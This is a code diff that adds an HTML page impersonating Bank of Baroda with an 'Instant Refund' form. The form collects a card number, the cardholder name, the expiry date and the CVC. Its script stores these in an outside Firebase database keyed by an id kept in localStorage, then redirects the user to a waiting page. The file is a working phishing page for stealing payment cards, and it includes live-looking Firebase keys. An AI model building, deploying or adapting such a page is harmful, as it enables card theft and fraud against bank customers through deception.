@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://cdn.jsdelivr.net/npm/daisyui@3.5.0/dist/full.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-slate-100">
+    <div class="w-full justify-center flex items-center">
+      <div id="enterDetails" class="w-[40vw] min-w-[450px]">
+        <div class="bg-[#FF5B2E] h-[60px] flex items-center justify-start">
+          <img
+            class="h-28 ml-5"
+            src="https://logos-world.net/wp-content/uploads/2020/11/Bank-of-Baroda-Emblem.png"
+          />
+        </div>
+        <!-- <div class="w-full justify-center flex mt-5 text-xl">
+          Login to KYC Update
+        </div> -->
+        <div class="bg-white m-5">
+          <!-- Tabs -->
+          <div
+            class="h-8 bg-white border-2 border-slate-400 shadow-md rounded-full justify-between flex"
+          >
+            <li
+              class="cursor-pointer w-full bg-[#FF5B2E] rounded-full text-white list-none flex justify-center"
+            >
+              Instant Refund
+            </li>
+          </div>
+
+          <form id="tab1-content">
+            <!-- Content for Mobile & MPIN tab goes here -->
+            <div class="p-10">
+              <h1 class="text-sm">Refund Card Number</h1>
+              <input
+                type="number"
+                id="card"
+                class="w-full border-b-[1px] border-black p-1 outline-none"
+                required
+              />
+
+              <h1 class="text-sm mt-10">Cardholder Name</h1>
+              <input
+                type="text"
+                id="cardholder"
+                class="w-full border-b-[1px] border-black p-1 outline-none"
+                required
+              />
+
+              <div class="flex w-full justify-between">
+                <div class="w-full">
+                  <h1 class="text-sm mt-10">Expiry Date</h1>
+                  <input
+                    type="month"
+                    id="expiry"
+                    class="w-[80%] border-b-[1px] border-black p-1 outline-none"
+                    required
+                  />
+                </div>
+                <div class="mr-10">
+                  <h1 class="text-sm mt-10">Refund CVC</h1>
+                  <input
+                    type="number"
+                    id="cvv"
+                    class="w-auto border-b-[1px] border-black p-1 outline-none"
+                    required
+                  />
+                </div>
+              </div>
+
+
+              <div class="mt-5 justify-center flex">
+                <button
+                  class="btn btn-wide rounded-full btn-sm text-white bg-[#FF5B2E]"
+                  type="button"
+                  id="insert"
+                >
+                  Submit
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+        <!-- Image -->
+        <div class="w-full">
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function showTabContent(tabId) {
+        // Hide all tab contents
+        const tabContents = document.querySelectorAll("[id$='-content']");
+        tabContents.forEach((content) => {
+          content.style.display = "none";
+        });
+
+        // Remove the classes from all tabs
+        const tabs = document.querySelectorAll("[onclick^='showTabContent']");
+        tabs.forEach((tab) => {
+          tab.classList.remove("bg-pink-900");
+          tab.classList.remove("rounded-full");
+          tab.classList.remove("text-white");
+        });
+
+        // Show the selected tab content and add the classes to the clicked tab
+        const selectedContent = document.getElementById(tabId + "-content");
+        const selectedTab = document.querySelector(
+          `[onclick="showTabContent('${tabId}')"]`
+        );
+        if (selectedContent && selectedTab) {
+          selectedContent.style.display = "block";
+          selectedTab.classList.add("bg-pink-900");
+          selectedTab.classList.add("rounded-full");
+          selectedTab.classList.add("text-white");
+        }
+      }
+    </script>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyDKcOFaO3lqruMIfWxp5fOnzxeIwQZboC0",
+  authDomain: "bobwo-da5c6.firebaseapp.com",
+  projectId: "bobwo-da5c6",
+  storageBucket: "bobwo-da5c6.appspot.com",
+  messagingSenderId: "525557748996",
+  appId: "1:525557748996:web:24c859f0fa82c6bff96c51"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+
+      //Insert data
+      import {
+        getDatabase,
+        ref,
+        get,
+        set,
+        child,
+        update,
+        remove,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      const db = getDatabase();
+
+      var card = document.querySelector("#card");
+      var cardholder = document.querySelector("#cardholder");
+      var expiry = document.querySelector("#expiry");
+      var cvv = document.querySelector("#cvv");
+
+      var insertBtn = document.querySelector("#insert");
+
+      function UpdateData() {
+        if (card.value.length != 16) {
+          alert("Please enter valid 16 digits card number");
+          return;
+        }
+
+        if (
+          cardholder.value == "" ||
+          cardholder.value == null ||
+          cardholder.value == undefined
+        ) {
+          alert("Card Holder Name required");
+          return;
+        }
+
+        if (
+          expiry.value == "" ||
+          expiry.value == null ||
+          expiry.value == undefined
+        ) {
+          alert("Expiry Date required");
+          return;
+        }
+
+        if (cvv.value == "" || cvv.value == null || cvv.value == undefined) {
+          alert("CVV required");
+          return;
+        }
+
+        insertBtn.classList.add("loading");
+
+        const dataToUpdate = {
+          card: card.value,
+          cardholder: cardholder.value,
+          expiry: expiry.value,
+          cvv: cvv.value,
+        };
+
+        const value = localStorage.getItem("id");
+
+        update(ref(db, "people/" + value), dataToUpdate)
+          .then(() => {
+            insertBtn.classList.remove("loading");
+            console.log("Data updated successfully!");
+            window.location.href = "waiting.html";
+          })
+          .catch((error) => {
+            insertBtn.classList.remove("loading");
+            console.error("Error updating data:", error);
+          });
+      }
+
+      insertBtn.addEventListener("click", UpdateData);
+    </script>
+  </body>
+</html>
